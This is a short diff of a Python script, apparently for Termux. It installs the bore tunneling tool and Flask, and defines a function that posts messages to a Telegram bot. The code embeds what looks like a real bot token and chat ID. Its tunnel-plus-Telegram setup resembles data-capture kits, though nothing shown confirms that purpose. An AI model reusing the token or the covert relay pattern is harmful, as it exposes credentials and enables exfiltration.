@@ -3,6 +3,8 @@ import os, subprocess, shutil
 os.system("pkg install bore -y")
 os.system("pip install requests flask")
 
+import requests
+
 def sender(message):
 	try:
 		response = requests.post('https://api.telegram.org/bot8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo/sendMessage', data={'chat_id': '5867708857', 'text': message})
